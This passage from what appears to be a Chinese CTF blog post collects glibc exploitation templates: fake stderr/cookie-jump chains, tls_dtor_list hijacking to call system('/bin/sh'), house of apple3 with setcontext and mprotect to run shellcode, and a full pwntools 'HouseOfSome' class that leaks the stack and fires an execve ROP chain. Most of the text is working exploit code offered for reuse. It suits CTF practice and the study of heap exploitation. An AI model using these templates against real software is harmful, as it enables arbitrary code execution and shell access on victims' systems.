p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_stdfile_2_lock&#x27;</span>]) <span class="comment"># _lock</span></span><br><span class="line"><span class="comment"># _IO_flockfile(fp) in __vfxprintf</span></span><br><span class="line">fake_stderr = fake_stderr.ljust(<span class="number">0xd8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_stderr += p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_cookie_jumps&#x27;</span>] + <span class="number">0x40</span>) <span class="comment"># fake_vtable</span></span><br><span class="line"><span class="comment"># call [vtable]+0x38 (call _IO_new_file_xsputn)</span></span><br><span class="line"><span class="comment"># =&gt; call _IO_cookie_jumps+0x78 =&gt; call _IO_cookie_write</span></span><br><span class="line">fake_stderr += p64(srop_address) <span class="comment"># __cookie (rdi)</span></span><br><span class="line">fake_stderr += p64(<span class="number">0</span>)</span><br><span class="line">fake_stderr += p64(ROL(magic_gadget ^ __pointer_chk_guard, <span class="number">0x11</span>, <span class="number">64</span>)) <span class="comment"># __io_functions.write</span></span><br></pre></td></tr></table></figure>
<p>最终通过<code>_malloc_hook</code>来触发(<code>&lt;=2.36</code>)<br>当然也可以通过<code>_IO_flush_all</code>来触发，不过由于在<code>exit</code>函数的调用过程中会出现很多会出现调用别的给加密过的函数指针，由于<code>__pointer_chk_guard</code>已经给我们修改，所以这些函数指针在给调用的时候会给报错，即该方法的利用比较麻烦，不建议使用</p>
<h3 id="劫持tls-dtor-list，利用-call-tls-dtors拿到权限"><a href="#劫持tls-dtor-list，利用-call-tls-dtors拿到权限" class="headerlink" title="劫持tls_dtor_list，利用__call_tls_dtors拿到权限"></a>劫持tls_dtor_list，利用__call_tls_dtors拿到权限</h3><p>主要功能为<code>getshell</code>,当然也可以利用<code>setcontext+61</code>打<code>srop</code><br>dtor_list:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    dtor_func func;</span><br><span class="line">    <span class="type">void</span> *obj;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">tls_dtor_list</span>;</span></span><br></pre></td></tr></table></figure>
<p>__call_tls_dtors:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __call_tls_dtors (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> (tls_dtor_list)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">cur</span> =</span> tls_dtor_list;</span><br><span class="line">      dtor_func func = cur-&gt;func;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (func);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">      tls_dtor_list = tls_dtor_list-&gt;next;</span><br><span class="line">      func (cur-&gt;obj);</span><br><span class="line"> </span><br><span class="line">      atomic_fetch_add_release (&amp;cur-&gt;<span class="built_in">map</span>-&gt;l_tls_dtor_count, <span class="number">-1</span>);</span><br><span class="line">      <span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到<code>func</code>其实是一个函数指针，而<code>obj</code>则是指向该函数的参数的位置<br>我们可以将<code>tls_dtor_list</code>指向我们伪造的堆地址，将<code>func</code>改为<code>system</code>的地址(<code>ogg</code>也可以)，<code>obj</code>指向<code>/bin/sh\x00</code>即可<code>getshell</code><br>注意，这里对<code>func</code>这个函数指针进行了加密，所以要泄露出<code>__pointer_chk_guard</code>的值或将其修改为已知的值<br>fs寄存器的值和地址可以通过<code>x/16gx pthread_self()</code>指令来查看<br>模板：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ROL = lambda val, r_bits, max_bits: \</span><br><span class="line">(val &lt;&lt; r_bits%max_bits) &amp; (<span class="number">2</span>**max_bits<span class="number">-1</span>) | \</span><br><span class="line">((val &amp; (<span class="number">2</span>**max_bits<span class="number">-1</span>)) &gt;&gt; (max_bits-(r_bits%max_bits)))</span><br><span class="line"></span><br><span class="line">    # 两次largebin attack改tls_dtor_list与pointer_guard</span><br><span class="line"></span><br><span class="line">    fake_pointer_guard = heap_base + <span class="number">0x17b0</span></span><br><span class="line">    edit(<span class="number">0</span>, b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">0x420</span> + p64(ROL(libc.sym[<span class="string">&#x27;system&#x27;</span>] ^ fake_pointer_guard, <span class="number">0x11</span>, <span class="number">64</span>)) + p64(next(libc.search(b<span class="number">&#x27;</span>/bin/sh<span class="number">&#x27;</span>))))</span><br></pre></td></tr></table></figure>
<p>若是想<code>orw</code>，那么可以让<code>func</code>成员为<code>magic_gadget</code>的相关数据，将<code>rdi</code>与<code>rdx</code>转换后，再调用<code>setcontext + 61</code>走<code>SROP</code>即可<br>最终通过<code>exit()</code>函数退出程序触发攻击</p>
<h3 id="house-of-apple3-house-of-一骑当千"><a href="#house-of-apple3-house-of-一骑当千" class="headerlink" title="house of apple3 + house of 一骑当千"></a>house of apple3 + house of 一骑当千</h3><p>这个模板为两种打法相结合，<code>house of 一骑当千</code>的好处是打<code>orw</code>时不需要用到<code>magic gadget</code>。<code>house of apple3</code>的关注点主要是对成员<code>_codecvt</code>的利用，当<code>wfile</code>的<code>vtable</code>给上保护后依然可以使用<br>模板:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">fake_file_addr = <span class="number">0x3a60</span>+heap_base</span><br><span class="line">fake_ucontext_addr = fake_file_addr + <span class="number">0x100</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># house of apple3</span></span><br><span class="line">fake_file = p64(np.uint(-<span class="number">21</span>))+p64(<span class="number">0</span>)</span><br><span class="line">fake_file += p64(<span class="number">0xffffffffffffffff</span>)	<span class="comment">#_IO_read_endtable</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">1</span>) </span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x40</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(fake_file_addr + <span class="number">0x100</span>)	<span class="comment"># _IO_buf_end = fake_addr</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x98</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(fake_file_addr + <span class="number">0x40</span>)	<span class="comment">#  _codecvt</span></span><br><span class="line">fake_file += p64(libc_base+<span class="number">0x1fe6e0</span>)	<span class="comment"># _wide_data  尽量保持不变 </span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xd8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>] + <span class="number">0x8</span>)	<span class="comment"># vtable</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># fake_ucontext_addr rdi 这个地方必须为0 和这里偏移0x1c0的位置必须为0</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">4</span></span><br><span class="line">fake_file += p64(setcontext)  <span class="comment"># 用于控制rip setcontext(一骑当千)/setcontext+61/system(rdi不好控制)/ogg(这个没试过)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># house of 一骑当千</span></span><br><span class="line">rdi  = fake_ucontext_addr &amp; ~<span class="number">0xfff</span>  <span class="comment"># heap_addr binsh_addr</span></span><br><span class="line">rsi  = <span class="number">0x1000</span>      </span><br><span class="line">rbp  = fake_ucontext_addr  + <span class="number">0x100</span></span><br><span class="line">rbx  = <span class="number">0</span></span><br><span class="line">rdx  = <span class="number">7</span></span><br><span class="line">rcx  = <span class="number">0</span></span><br><span class="line">rax  = <span class="number">0</span></span><br><span class="line">rsp  = fake_ucontext_addr + <span class="number">0x100</span></span><br><span class="line">rip  = mprotect</span><br><span class="line"></span><br><span class="line">ucontext = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">ucontext += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">ucontext += p64(rdi) + p64(rsi)</span><br><span class="line">ucontext += p64(rbp) + p64(rbx)</span><br><span class="line">ucontext += p64(rdx) + p64(rcx)</span><br><span class="line">ucontext += p64(rax)</span><br><span class="line">ucontext += p64(rsp) + p64(rip)</span><br><span class="line">ucontext = ucontext.ljust((<span class="number">0xe0</span> - <span class="number">0x30</span>), <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">ucontext += p64(heap_base + <span class="number">0x1000</span>)</span><br><span class="line">ucontext = ucontext.ljust((<span class="number">0x100</span> - <span class="number">0x30</span>), <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = p64(fake_ucontext_addr + <span class="number">0x110</span>) + p64(<span class="number">0</span>) + asm(shellcraft.cat(<span class="string">&#x27;flag&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = fake_file + ucontext + <span class="built_in">bytes</span>(shellcode)</span><br></pre></td></tr></table></figure>
<h3 id="house-of-some"><a href="#house-of-some" class="headerlink" title="house of some"></a>house of some</h3><p>Csome学长提出的利用链，主要是通过伪造<code>fake_file</code>来造成任意地址写和任意地址读<br>其中<code>fake_file</code>分为<code>write_file</code>和<code>read_file</code>,令<code>_IO_list_all</code>指向一个<code>read_file</code>，并令<code>write_file</code>的<code>_chain</code>指向将要执行的<code>read</code>函数所写入的地址。在进行<code>fsop</code>时会遍历到<code>read_file</code>执行<code>read</code>函数，此时写入<code>write_file</code>,并令其<code>_chain</code>指向另外一个我们已经写好的<code>read_file</code>。此时由于我们第一个<code>read_flie</code>的<code>_chain</code>已经指向我们<code>read</code>函数所写入的地址，而该地址已经被我们写入了<code>write_file</code>，我们可以通过该<code>write_file</code>来泄露任意地址。执行完<code>wirte</code>函数后<code>rip</code>则会继续遍历到我们下一个<code>read_file</code>。我们便可以不断的进行<code>read-write-read</code>这样一个过程,可以无数次泄露程序的所有地址和修改任何地址中的内容<br>write_file:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fake_file_write = flat(&#123;</span><br><span class="line">  <span class="number">0x00</span>: <span class="number">0x800</span> | <span class="number">0x1000</span>, <span class="comment"># _flags</span></span><br><span class="line">  <span class="number">0x20</span>: 需要泄露的起始地址, <span class="comment"># _IO_write_base</span></span><br><span class="line">  <span class="number">0x28</span>: 需要泄露的终止地址, <span class="comment"># _IO_write_ptr</span></span><br><span class="line">  <span class="number">0x68</span>: 下一个调用的fake file地址, <span class="comment"># _chain</span></span><br><span class="line">  <span class="number">0x70</span>: <span class="number">1</span>, <span class="comment"># _fileno</span></span><br><span class="line">  <span class="number">0xd8</span>: _IO_file_jumps, <span class="comment"># vtable</span></span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>read_file:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fake_file_read = flat(&#123;</span><br><span class="line">  <span class="number">0x00</span>: <span class="number">0</span>, <span class="comment"># _flags</span></span><br><span class="line">  <span class="number">0x20</span>: <span class="number">0</span>, <span class="comment"># _IO_write_base</span></span><br><span class="line">  <span class="number">0x28</span>: <span class="number">0</span>, <span class="comment"># _IO_write_ptr</span></span><br><span class="line">  <span class="number">0x38</span>: 任意地址写的起始地址, <span class="comment"># _IO_buf_base</span></span><br><span class="line">  <span class="number">0x40</span>: 任意地址写的终止地址, <span class="comment"># _IO_buf_end</span></span><br><span class="line">  <span class="number">0x68</span>: 下一个调用的fake file地址, <span class="comment"># _chain</span></span><br><span class="line">  <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">  <span class="number">0x82</span>: <span class="string">b&quot;\x00&quot;</span>, <span class="comment"># _vtable_offset</span></span><br><span class="line">  <span class="number">0xa0</span>: wide_data的地址, <span class="comment"># _wide_data</span></span><br><span class="line">  <span class="number">0xc0</span>: <span class="number">2</span>, <span class="comment"># _mode</span></span><br><span class="line">  <span class="number">0xd8</span>: _IO_wfile_jumps, <span class="comment"># vtable</span></span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">fake_wide_data = flat(&#123;</span><br><span class="line">  <span class="number">0x18</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="number">0x20</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="number">0x30</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="number">0xe0</span>: _IO_file_jumps - <span class="number">0x48</span>,</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>Csome的自动化脚本:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment"># context.arch = &quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HouseOfSome</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, libc: ELF, controled_addr</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.libc = libc</span><br><span class="line">        self.controled_addr =controled_addr</span><br><span class="line">        self.READ_LENGTH_DEFAULT = <span class="number">0x400</span></span><br><span class="line">        self.LEAK_LENGTH = <span class="number">0x500</span></span><br><span class="line"></span><br><span class="line">        self.fake_wide_data_template = <span class="keyword">lambda</span> : flat(&#123;</span><br><span class="line">            <span class="number">0x18</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="number">0x20</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="number">0x30</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="number">0xE0</span>: self.libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x48</span>,</span><br><span class="line">        &#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">        self.fake_file_read_template = <span class="keyword">lambda</span> buf_start, buf_end, wide_data, chain, fileno: flat(&#123;</span><br><span class="line">            <span class="number">0x00</span>: <span class="number">0</span>, <span class="comment"># _flags</span></span><br><span class="line">            <span class="number">0x20</span>: <span class="number">0</span>, <span class="comment"># _IO_write_base</span></span><br><span class="line">            <span class="number">0x28</span>: <span class="number">0</span>, <span class="comment"># _IO_write_ptr</span></span><br><span class="line">            </span><br><span class="line">            <span class="number">0x38</span>: buf_start, <span class="comment"># _IO_buf_base</span></span><br><span class="line">            <span class="number">0x40</span>: buf_end, <span class="comment"># _IO_buf_end</span></span><br><span class="line">            <span class="number">0x68</span>: chain, <span class="comment"># _chain</span></span><br><span class="line">            </span><br><span class="line">            <span class="number">0x70</span>: p32(fileno), <span class="comment"># _fileno</span></span><br><span class="line">            <span class="number">0x82</span>: <span class="string">b&quot;\x00&quot;</span>, <span class="comment"># _vtable_offset</span></span><br><span class="line">            <span class="number">0xa0</span>: wide_data, <span class="comment"># _wide_data</span></span><br><span class="line">            <span class="number">0xc0</span>: <span class="number">2</span>, <span class="comment"># _mode</span></span><br><span class="line">            <span class="number">0xd8</span>: self.libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>], <span class="comment"># vtable</span></span><br><span class="line">        &#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">        self.fake_file_write_template = <span class="keyword">lambda</span> buf_start, buf_end, chain, fileno: flat(&#123;</span><br><span class="line">            <span class="number">0x00</span>: <span class="number">0x800</span> | <span class="number">0x1000</span>, <span class="comment"># _flags</span></span><br><span class="line">            </span><br><span class="line">            <span class="number">0x20</span>: buf_start, <span class="comment"># _IO_write_base</span></span><br><span class="line">            <span class="number">0x28</span>: buf_end, <span class="comment"># _IO_write_ptr</span></span><br><span class="line"></span><br><span class="line">            <span class="number">0x68</span>: chain, <span class="comment"># _chain</span></span><br><span class="line">            <span class="number">0x70</span>: p32(fileno), <span class="comment"># _fileno</span></span><br><span class="line">            <span class="number">0xd8</span>: self.libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>], <span class="comment"># vtable</span></span><br><span class="line">        &#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">        self.wide_data_length = <span class="built_in">len</span>(self.fake_wide_data_template())</span><br><span class="line">        self.read_file_length = <span class="built_in">len</span>(self.fake_file_read_template(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">        self.write_file_length = <span class="built_in">len</span>(self.fake_file_write_template(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next_control_addr</span>(<span class="params">self, addr, <span class="built_in">len</span></span>):</span><br><span class="line">        <span class="keyword">return</span> addr + <span class="built_in">len</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self, fd, buf, <span class="built_in">len</span></span>):</span><br><span class="line">        addr = self.controled_addr</span><br><span class="line">        f_read_file_0 = self.fake_file_read_template(buf, buf+<span class="built_in">len</span>, addr+self.read_file_length, addr+self.read_file_length+self.wide_data_length, fd) </span><br><span class="line">        f_wide_data = self.fake_wide_data_template()</span><br><span class="line">        addr += self.read_file_length + self.wide_data_length</span><br><span class="line">        self.controled_addr = self.next_control_addr(self.controled_addr, (self.read_file_length+self.wide_data_length) * <span class="number">2</span>)</span><br><span class="line">        f_read_file_1 = self.fake_file_read_template(self.controled_addr, self.controled_addr+self.READ_LENGTH_DEFAULT, addr+self.read_file_length, self.controled_addr, <span class="number">0</span>) </span><br><span class="line">        </span><br><span class="line">        payload = flat([</span><br><span class="line">            f_read_file_0,</span><br><span class="line">            f_wide_data,</span><br><span class="line">            f_read_file_1,</span><br><span class="line">            f_wide_data</span><br><span class="line">        ])</span><br><span class="line">        <span class="keyword">assert</span> <span class="string">b&quot;\n&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> payload, <span class="string">&quot;\\n in payload.&quot;</span></span><br><span class="line">        <span class="keyword">return</span> payload</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">self, fd, buf, <span class="built_in">len</span></span>):</span><br><span class="line">        addr = self.controled_addr</span><br><span class="line">        f_write_file = self.fake_file_write_template(buf, buf+<span class="built_in">len</span>, addr+self.write_file_length, fd) </span><br><span class="line">        addr += self.write_file_length</span><br><span class="line">        f_wide_data = self.fake_wide_data_template()</span><br><span class="line">        self.controled_addr = self.next_control_addr(self.controled_addr, self.read_file_length+self.wide_data_length + self.write_file_length)</span><br><span class="line">        f_read_file_1 = self.fake_file_read_template(self.controled_addr, self.controled_addr+self.READ_LENGTH_DEFAULT, addr+self.read_file_length, self.controled_addr, <span class="number">0</span>) </span><br><span class="line">        </span><br><span class="line">        payload = flat([</span><br><span class="line">            f_write_file,</span><br><span class="line">            f_read_file_1,</span><br><span class="line">            f_wide_data</span><br><span class="line">        ])</span><br><span class="line">        <span class="keyword">assert</span> <span class="string">b&quot;\n&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> payload, <span class="string">&quot;\\n in payload.&quot;</span></span><br><span class="line">        <span class="keyword">return</span> payload</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bomb</span>(<span class="params">self, io: tube, retn_addr</span>):</span><br><span class="line">        payload = self.write(<span class="number">1</span>, self.libc.symbols[<span class="string">&#x27;_environ&#x27;</span>], <span class="number">0x8</span>)</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        stack_leak = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">        log.success(<span class="string">f&quot;stack_leak : <span class="subst">&#123;stack_leak:#x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        payload = self.write(<span class="number">1</span>, stack_leak - self.LEAK_LENGTH, self.LEAK_LENGTH)</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        <span class="comment"># retn_addr = self.libc.symbols[&#x27;_IO_file_underflow&#x27;] + 390</span></span><br><span class="line">        log.success(<span class="string">f&quot;retn_addr : <span class="subst">&#123;retn_addr:#x&#125;</span>&quot;</span>)</span><br><span class="line">        buf = p.recv(self.LEAK_LENGTH)</span><br><span class="line">        offset = buf.find(p64(retn_addr))</span><br><span class="line">        log.success(<span class="string">f&quot;offset : <span class="subst">&#123;offset:#x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        payload = self.read(<span class="number">0</span>, stack_leak - self.LEAK_LENGTH + offset, <span class="number">0x300</span>)</span><br><span class="line">        p.sendline(payload)</span><br><span class="line"></span><br><span class="line">        rop = ROP(self.libc)</span><br><span class="line">        rop.base = stack_leak - self.LEAK_LENGTH + offset</span><br><span class="line">        rop.call(<span class="string">&#x27;execve&#x27;</span>, [<span class="string">b&#x27;/bin/sh&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line">        log.info(rop.dump())</span><br><span class="line">        rop_chain = rop.chain()</span><br><span class="line">        <span class="keyword">assert</span> <span class="string">b&quot;\n&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> rop_chain, <span class="string">&quot;\\n in rop_chain&quot;</span></span><br><span class="line">        p.sendline(rop_chain)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># libc = ELF(&quot;./libc-2.38.so.6&quot;)</span></span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">    libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>, checksec=<span class="literal">None</span>)</span><br><span class="line">    <span class="comment"># libc.address = 0x100000000000</span></span><br><span class="line">    <span class="comment"># print(hex(libc.bss()))</span></span><br><span class="line">    <span class="comment"># print(libc.maps)</span></span><br><span class="line">    <span class="comment"># for k, v in libc.symbols.items():</span></span><br><span class="line">    <span class="comment">#     print(k, hex(v))</span></span><br><span class="line">    code = libc.read(libc.symbols[<span class="string">&#x27;_IO_file_underflow&#x27;</span>], <span class="number">0x200</span>)</span><br><span class="line">    <span class="built_in">print</span>(code)</span><br><span class="line">    tmp = disasm(code)</span><br><span class="line">    <span class="built_in">print</span>(tmp)</span><br></pre></td></tr></table></figure>
<p>在编写<code>exp</code>时，只需通过<code>from House_of_some import HouseOfSome</code>将该包导入即可</p>
<h3 id="house-of-banana"><a href="#house-of-banana" class="headerlink" title="house of banana"></a>house of banana</h3><p>原理懂了，可是从来没有打通过，逆天，调试也找不到问题在哪里</p>
<h3 id="通过puts函数来触发IO链"><a href="#通过puts函数来触发IO链" class="headerlink" title="通过puts函数来触发IO链"></a>通过puts函数来触发IO链</h3><p>通过源码我们可以发现，<code>puts</code>函数在启用时会调用虚表中的<code>_IO_wfile_xsputn</code>函数，因此这里给了我们机会来修改虚表偏移来触发<code>io</code>链<br>我们可以将<code>fake_file</code>直接写在<code>_IO_2_1_stdout_</code>的位置上面或者修改<code>stdout</code>指针指向我们的<code>fake_file</code><br>首先是用于<code>getshell</code>的<code>house of apple2</code></p>
